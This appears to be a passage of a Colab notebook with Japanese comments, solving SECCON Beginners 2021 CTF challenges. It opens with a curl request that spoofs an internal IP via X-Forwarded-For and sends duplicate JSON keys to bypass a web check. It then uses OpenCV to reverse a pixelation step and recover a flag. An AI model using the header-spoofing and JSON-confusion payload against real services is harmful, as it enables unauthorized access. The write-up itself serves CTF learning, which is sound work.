    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "9PUNsD8ER-1p",
        "outputId": "72efe800-f132-491f-c25f-fe069a423d09"
      },
      "source": [
        "!curl -H \"X-Forwarded-For:192.168.111.10\" -H \"Content-Type:application/json\"  -d '{\"id\":2, \"id\":1}' https://json.quals.beginners.seccon.jp/"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "{\"result\":\"ctf4b{j50n_is_v4ry_u5efu1_bu7_s0metim3s_it_bi7es_b4ck}\"}"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "DXc67VS2qjCM"
      },
      "source": [
        "# misc"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7NLBEH7aqT60"
      },
      "source": [
        "##depixelazation"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "nimNK-ShLjCn"
      },
      "source": [
        "本番中はwkwkさんが解いちゃったのでノータッチ。\n",
        "\n",
        "終わってからちょっと考えて、モザイクが取れそうな気がしたのでチャレンジしてみた。"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "iW7Ac-Ndtc7f"
      },
      "source": [
        "描画パート"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 268
        },
        "id": "YjzLEUxdDbYy",
        "outputId": "7bf96401-95f1-4e23-a812-1ab705ae6141"
      },
      "source": [
        "import cv2\n",
        "import numpy as np\n",
        "import matplotlib.pyplot as plt\n",
        "\n",
        "i=\"F\"\n",
        "\n",
        "img = np.full((100, 85, 3), (255,255,255), dtype=np.uint8)\n",
        "cv2.putText(img, i, (0, 80), cv2.FONT_HERSHEY_PLAIN, 8, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "\n",
        "# plt.imshow(cv2.cvtColor(img, cv2.COLOR_BGR2RGB))\n",
        "plt.imshow(img)\n",
        "\n",
        "plt.show()\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "image/png": "[encoded data removed]",
            "text/plain": [
              "<Figure size 432x288 with 1 Axes>"
            ]
          },
          "metadata": {
            "tags": [],
            "needs_background": "light"
          }
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "NGYxPXJguBAT"
      },
      "source": [
        "全ての文字（asciiコード：33〜126）を書く"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 90
        },
        "id": "AEqq7ck1VDZz",
        "outputId": "9dc28526-458d-44d3-cdbd-846ca668b7ae"
      },
      "source": [
        "import cv2\n",
        "import numpy as np\n",
        "import matplotlib.pyplot as plt\n",
        "\n",
        "flag = \"\".join([chr(i) for i in range(33, 127)])\n",
        "\n",
        "print(flag)\n",
        "\n",
        "images = np.full((100, 85, 3), (255,255,255), dtype=np.uint8)\n",
        "\n",
        "for i in flag:\n",
        "\n",
        "    # char2img\n",
        "    img = np.full((100, 85, 3), (255,255,255), dtype=np.uint8)\n",
        "    cv2.putText(img, i, (0, 80), cv2.FONT_HERSHEY_PLAIN, 8, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "\n",
        "    # pixelization\n",
        "    cv2.putText(img, \"P\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 7, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    cv2.putText(img, \"I\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 8, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    cv2.putText(img, \"X\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 9, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    simg = cv2.resize(img, None, fx=0.1, fy=0.1, interpolation=cv2.INTER_NEAREST) # WTF :-o\n",
        "    img = cv2.resize(simg, img.shape[:2][::-1], interpolation=cv2.INTER_NEAREST)\n",
        "\n",
        "    # 個別表示用\n",
        "    # plt.imshow(img)\n",
        "    # plt.show()\n",
        "\n",
        "    # concat\n",
        "    if images.all():\n",
        "        images = img\n",
        "    else:\n",
        "        images = cv2.hconcat([images, img])\n",
        "\n",
        "plt.imshow(images)\n",
        "plt.show()\n",
        "\n",
        "cv2.imwrite(\"/content/drive/MyDrive/seccon4b2021/output_ascii.png\", images)\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "display_data",
          "data": {
            "image/png": "[encoded data removed]",
            "text/plain": [
              "<Figure size 432x288 with 1 Axes>"
            ]
          },
          "metadata": {
            "tags": [],
            "needs_background": "light"
          }
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "True"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 30
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "zM-4zmbuy_H6"
      },
      "source": [
        "入力がない画像（mask）との差分を取る"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 90
        },
        "id": "vmP99SviymQl",
        "outputId": "e44afd78-1d87-4df1-d093-1ce6b6c25902"
      },
      "source": [
        "import cv2\n",
        "import numpy as np\n",
        "import matplotlib.pyplot as plt\n",
        "\n",
        "flag = \"\".join([chr(i) for i in range(33, 127)])\n",
        "\n",
        "print(flag)\n",
        "\n",
        "images = np.full((100, 85, 3), (255,255,255), dtype=np.uint8)\n",
        "\n",
        "for i in flag:\n",
        "\n",
        "    # char2img\n",
        "    img = np.full((100, 85, 3), (255,255,255), dtype=np.uint8)\n",
        "    cv2.putText(img, i, (0, 80), cv2.FONT_HERSHEY_PLAIN, 8, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "\n",
        "    # pixelization\n",
        "    cv2.putText(img, \"P\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 7, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    cv2.putText(img, \"I\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 8, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    cv2.putText(img, \"X\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 9, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    simg = cv2.resize(img, None, fx=0.1, fy=0.1, interpolation=cv2.INTER_NEAREST) # WTF :-o\n",
        "    img = cv2.resize(simg, img.shape[:2][::-1], interpolation=cv2.INTER_NEAREST)\n",
        "\n",
        "    # mask_img\n",
        "    mask_img = np.full((100, 85, 3), (255,255,255), dtype=np.uint8)\n",
        "    cv2.putText(mask_img, \"\", (0, 80), cv2.FONT_HERSHEY_PLAIN, 8, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    cv2.putText(mask_img, \"P\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 7, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    cv2.putText(mask_img, \"I\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 8, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    cv2.putText(mask_img, \"X\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 9, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    mask_simg = cv2.resize(mask_img, None, fx=0.1, fy=0.1, interpolation=cv2.INTER_NEAREST) # WTF :-o\n",
        "    mask_img = cv2.resize(mask_simg, mask_img.shape[:2][::-1], interpolation=cv2.INTER_NEAREST)\n",
        "\n",
        "    #差分\n",
        "    diff_img = cv2.absdiff(img, mask_img)\n",
        "\n",
        "    # concat\n",
        "    if images.all():\n",
        "        images = diff_img\n",
        "    else:\n",
        "        images = cv2.hconcat([images, diff_img])\n",
        "\n",
        "plt.imshow(images)\n",
        "plt.show()\n",
        "\n",
        "cv2.imwrite(\"/content/drive/MyDrive/seccon4b2021/output_ascii_diff.png\", images)\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "display_data",
          "data": {
            "image/png": "[encoded data removed]",
            "text/plain": [
              "<Figure size 432x288 with 1 Axes>"
            ]
          },
          "metadata": {
            "tags": [],
            "needs_background": "light"
          }
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "True"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 13
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "e2Z82bVsL19J"
      },
      "source": [
        "うーん、文字によってはいけなくもない感じ・・・"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "LqrTQUjgwbmK"
      },
      "source": [
        "mask用画像の作成（31個分）"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 82
        },
        "id": "Xq-YdHhXahlg",
        "outputId": "fc3488cc-ae42-4c20-e84b-2a65ead5cf89"
      },
      "source": [
        "import cv2\n",
        "import numpy as np\n",
        "import matplotlib.pyplot as plt\n",
        "\n",
        "images = np.full((100, 85, 3), (255,255,255), dtype=np.uint8)\n",
        "\n",
        "for _ in range(31):\n",
        "\n",
        "    # char2img\n",
        "    img = np.full((100, 85, 3), (255,255,255), dtype=np.uint8)\n",
        "    cv2.putText(img, \"\", (0, 80), cv2.FONT_HERSHEY_PLAIN, 8, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "\n",
        "    # pixelization\n",
        "    cv2.putText(img, \"P\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 7, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    cv2.putText(img, \"I\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 8, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    cv2.putText(img, \"X\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 9, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    simg = cv2.resize(img, None, fx=0.1, fy=0.1, interpolation=cv2.INTER_NEAREST) # WTF :-o\n",
        "    img = cv2.resize(simg, img.shape[:2][::-1], interpolation=cv2.INTER_NEAREST)\n",
        "\n",
        "    # concat\n",
        "    if images.all():\n",
        "        images = img\n",
        "    else:\n",
        "        images = cv2.hconcat([images, img])\n",
        "\n",
        "plt.imshow(images)\n",
        "plt.show()\n",
        "\n",
        "cv2.imwrite(\"/content/drive/MyDrive/seccon4b2021/output_mask.png\", images)\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "image/png": "[encoded data removed]",
            "text/plain": [
              "<Figure size 432x288 with 1 Axes>"
            ]
          },
          "metadata": {
            "tags": [],
            "needs_background": "light"
          }
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "True"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 7
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "O18XG6Iqx3Xp"
      },
      "source": [
        "flagとmask画像の差分を取る"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 82
        },
        "id": "emHbo7hxdVvB",
        "outputId": "8cd7e1ea-dc6d-4682-9084-9577bf2fd682"
      },
      "source": [
        "import cv2\n",
        "import numpy as np\n",
        "from matplotlib import pylab as plt\n",
        "\n",
        "img_org  = cv2.imread('/content/drive/MyDrive/seccon4b2021/output_org.png', 1)\n",
        "img_mask = cv2.imread('/content/drive/MyDrive/seccon4b2021/output_mask.png', 1)\n",
        "\n",
        "img_diff = cv2.absdiff(img_org, img_mask)\n",
        "ret, img_bin = cv2.threshold(img_diff, 50, 255, 0)\n",
        "\n",
        "plt.imshow(img_bin)\n",
        "plt.show()\n",
        "\n",
        "cv2.imwrite(\"/content/drive/MyDrive/seccon4b2021/output.png\", img_bin)\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "image/png": "[encoded data removed]",
            "text/plain": [
              "<Figure size 432x288 with 1 Axes>"
            ]
          },
          "metadata": {
            "tags": [],
            "needs_background": "light"
          }
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "True"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 9
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "80EtRut1LIeJ"
      },
      "source": [
        "頑張れば読めそう。"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "B1q-Q0Ai3ISw"
      },
      "source": [
        "wkwkさんのコード。やっぱエレガント。\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "04VpG1KJ3YFu"
      },
      "source": [
        "flagを分離（この辺がエレガント）"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 285
        },
        "id": "PFtwSV88mEnG",
        "outputId": "4c17a61b-c06e-4d9f-c5a7-faf1f17cad42"
      },
      "source": [
        "import cv2\n",
        "import numpy as np\n",
        "import matplotlib.pyplot as plt\n",
        "\n",
        "imgs = cv2.imread('/content/drive/MyDrive/seccon4b2021/output_org.png') \n",
        "cuts = imgs.shape[1] // 85\n",
        "\n",
        "flag_imgs = []\n",
        "\n",
        "for i in range(cuts):\n",
        "  flag_imgs.append(imgs[:, i*85:(i+1)*85])\n",
        "\n",
        "plt.imshow(flag_imgs[25])\n",
        "plt.show()\n",
        "\n",
        "print(len(flag_imgs))\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "image/png": "[encoded data removed]",
            "text/plain": [
              "<Figure size 432x288 with 1 Axes>"
            ]
          },
          "metadata": {
            "tags": [],
            "needs_background": "light"
          }
        },
        {
          "output_type": "stream",
          "text": [
            "31\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "GDeQT1Fh31fU"
      },
      "source": [
        "asciiコードと比較する"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "oqDjhTn732nH",
        "outputId": "f21f9ebe-fa68-4ecc-90c2-7ba36df5123c"
      },
      "source": [
        "asc = [chr(i) for i in range(33, 127)]\n",
        "\n",
        "asc_imgs=[]\n",
        "\n",
        "for i in asc:\n",
        "\n",
        "  # char2img\n",
        "  img = np.full((100, 85, 3), (255,255,255), dtype=np.uint8)\n",
        "  cv2.putText(img, i, (0, 80), cv2.FONT_HERSHEY_PLAIN, 8, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "\n",
        "  # pixelization\n",
        "  cv2.putText(img, \"P\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 7, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "  cv2.putText(img, \"I\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 8, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "  cv2.putText(img, \"X\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 9, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "  simg = cv2.resize(img, None, fx=0.1, fy=0.1, interpolation=cv2.INTER_NEAREST) # WTF :-o\n",
        "  img = cv2.resize(simg, img.shape[:2][::-1], interpolation=cv2.INTER_NEAREST)\n",
        "\n",
        "  asc_imgs.append(img)\n",
        "\n",
        "ans = []\n",
        "\n",
        "for f in flag_imgs:\n",
        "  for i, a in enumerate(asc_imgs):\n",
        "    if (f == a).all():\n",
        "      ans.append(i)\n",
        "      break\n",
        "\n",
        "flag = \"\".join([chr(i+33) for i in ans])\n",
        "\n",
        "print(flag)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "ctf4b{1f_y0u_p1x_y0u_c4n_3p1x}\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "T3GQs-OYAsiI"
      },
      "source": [
        "？？？\n",
        "なぜか*d*が復号されない・・・\n",
        "\n",
        "discordのソースを貼り付けてもやっぱできないので、環境依存かな。"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "DgXs2yO4BWjN",
        "outputId": "ea315b31-8081-45eb-ac39-7d6da5907cb9"
      },
      "source": [
        "import cv2\n",
        "import numpy as np\n",
        "\n",
        "# misc -> depixelization\n",
        "\n",
        "def encode_img(text):\n",
        "    img = np.full((100, 85, 3), (255,255,255), dtype=np.uint8)\n",
        "    cv2.putText(img, text, (0, 80), cv2.FONT_HERSHEY_PLAIN, 8, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "\n",
        "    # pixelization\n",
        "    cv2.putText(img, \"P\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 7, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    cv2.putText(img, \"I\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 8, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    cv2.putText(img, \"X\", (0, 90), cv2.FONT_HERSHEY_PLAIN, 9, (0, 0, 0), 5, cv2.LINE_AA)\n",
        "    simg = cv2.resize(img, None, fx=0.1, fy=0.1, interpolation=cv2.INTER_NEAREST) \n",
        "    img = cv2.resize(simg, img.shape[:2][::-1], interpolation=cv2.INTER_NEAREST)\n",
        "    return img\n",
        "\n",
        "\n",
        "chars = [chr(i) for i in range(33, 126)]\n",
        "\n",
        "char_imgs = {}\n",
        "\n",
        "for c in chars:\n",
        "    char_imgs[c] = encode_img(c)\n",
        "\n",
        "imgs = cv2.imread('/content/drive/MyDrive/seccon4b2021/output_org.png') \n",
        "cuts = imgs.shape[1] // 85\n",
        "flag_imgs = []\n",
        "\n",
        "for i in range(cuts):\n",
        "    flag_imgs.append(imgs[:, i*85:(i+1)*85])\n",
        "flag = []\n",
        "for img in flag_imgs:\n",
        "    for k, v in char_imgs.items():\n",
        "        if (v == img).all():\n",
        "            flag.append(k)\n",
        "\n",
        "print(''.join(flag))"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "ctf4b{1f_y0u_p1x_y0u_c4n_3p1x}\n"
          ],
          "name": "stdout"
        }
      ]
    }
  ]
}